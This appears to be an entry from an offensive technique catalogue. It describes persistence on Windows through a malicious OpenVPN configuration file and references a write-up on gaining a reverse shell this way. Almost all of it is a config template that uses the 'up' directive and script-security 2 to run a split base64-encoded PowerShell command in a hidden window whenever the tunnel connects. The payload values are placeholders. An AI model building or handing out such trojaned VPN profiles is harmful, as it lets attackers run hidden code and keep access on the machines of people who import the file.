---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - network-protocols
  - openvpn
  - windows
credits:
  - Jacob Baines
---
# OpenVPN

```
remote 192.168.1.245
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
setenv z1 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
setenv a1 '<base64_encoded>'
setenv b1 '<base64_encoded>'
setenv c1 '<base64_encoded>'
setenv d1 '<base64_encoded>'
setenv e1 '<base64_encoded>'
setenv f1 '<base64_encoded>'
setenv g1 '<base64_encoded>'
setenv h1 '<base64_encoded>'
setenv i1 '<base64_encoded>'
setenv j1 '<base64_encoded>'
setenv k1 '<base64_encoded>'
setenv l1 '<base64_encoded>'
setenv m1 '<base64_encoded>'
setenv n1 '<base64_encoded>'
setenv o1 '<base64_encoded>'
setenv p1 '<base64_encoded>'
setenv q1 '<base64_encoded>'
setenv r1 '<base64_encoded>'
setenv s1 '<base64_encoded>'

up "C:\\Windows\\System32\\cmd.exe /c (start %z1% -WindowStyle Hidden -EncodedCommand %a1%%b1%%c1%%d1%%e1%%f1%%g1%%h1%%i1%%j1%%k1%%l1%%m1%%n1%%o1%%p1%%q1%%r1%%s1%) ||"
```

---
## References

- [Jacob Baines: Reverse Shell from an OpenVPN Configuration File](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da)